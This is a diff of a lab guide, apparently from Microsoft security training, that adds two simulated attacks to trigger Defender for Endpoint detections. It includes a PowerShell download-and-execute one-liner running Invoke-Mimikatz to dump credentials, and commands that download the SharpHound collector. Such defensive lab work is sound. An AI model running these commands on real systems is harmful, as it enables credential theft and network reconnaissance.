@@ -4,20 +4,47 @@
 
 ## Simulated Attacks
 
-In this task, you will run one simulated attack to explore the capabilities of Microsoft Defender for Endpoint.
+In this task, you will run two simulated attack to explore the capabilities of Microsoft Defender for Endpoint.
 
-1. If you are not already at the Microsoft Defender Security Center in your browser, go to the Microsoft Defender Security Center at (https://security.microsoft.com) logged in as Admin for your tenant.
+1. If you are not already at the Microsoft Defender XDR portal in your browser, go to Microsoft Defender XDR at (https://security.microsoft.com) logged in as Admin for your tenant.
 
-1. From the menu, under **Endpoints**, select **Evaluation & tutorials** and then select **Tutorials & simulations** from the left side.
+You will run the *simulated* attacks using *PowerShell* on *WIN1* to explore the capabilities of Microsoft Defender for Endpoint.
 
-1. Select the **Tutorials** tab.
+`Attack 1: Mimikatz - Credential Dumping`
 
-1. Under *Automated investigation (backdoor)* you will see a message describing the scenario. Below this paragraph, click **Read the walkthrough**. A new browser tab opens which includes instructions to perform the simulation.
+1. On the *WIN1* machine, type **Command** in the search bar and select **Run as administrator**.
 
-1. In the new browser tab, locate the section named **Run the simulation** (page 5, starting at step 2) and follow the steps to run the attack. **Hint:** The simulation file *RS4_WinATP-Intro-Invoice.docm* can be found back in portal, just below the **Read the walkthrough** you selected in the previous step by selecting the **Get simulation file** button.
+1. Copy and paste the following command in the **Administrator: Command Prompt** window and press **Enter** to run it.
 
-    1. **Note:** After executing the file with the  exploit, you can return to the [Microsoft 365 Defender Security Center](https://security.microsoft.com) and click on the **Incidents** tab to see the alerts. The guide incorrectly references the *Microsoft Defender ATP portal* which has been migrated and rebranded.
-    1. Open the incident page and click **Manage Incident**. Click **Resolve incident** to resolve all of the active alerts.
+    ```CommandPrompt
+    powershell.exe "IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds"
+    ```
 
+1. You should see a message that says *Access is denied*, and a pop-up message from `Microsoft Defender Antivirus, Windows Security Virus and threats protection` displaying *Threats found*.
+
+1. Exit the **Administrator: Command Prompt** window by typing **exit** and pressing **Enter**.
+
+`Attack 2: Bloodhound - Collection`
+
+1. On the *WIN1* machine, type **PowerShell** in the search bar, select **Windows PowerShell** and select **Run as administrator**.
+
+1. Copy and paste the following commands in the **Administrator: Windows PowerShell** window and press **Enter** to run it.
+
+    ```PowerShell
+    New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+    Invoke-WebRequest "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1"
+    ```
+
+    >**Note:** It is recommended to copy, paste and run the commands one at a time. You can open *Notepad* and copy the commands into a temporary file to accomplish this. The first command creates a folder named *ExternalPayloads* in the same folder where the *Atomic Red Team* folder is located. The second command downloads the *SharpHound.ps1* file from the *BloodHound* GitHub repository and saves it in the *ExternalPayloads* folder.
+
+1. You should see a  pop-up message from `Windows Security Virus and threats protection` displaying *Threats found*.
+
+1. Copy and paste the following command in the **Administrator: Windows PowerShell** window and press **Enter** to run it.
+
+    ```PowerShell
+    Test-Path "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1"
+    ```
+
+1. If the output is *True*, the Malware payload file has not been removed by Microsoft Defender Antivirus. If the output is *False*, the Malware payload file has been removed by Microsoft Defender Antivirus. Use the up-arrow key to repeat the command until the output is *False*.
 
 ## You have completed the Demo
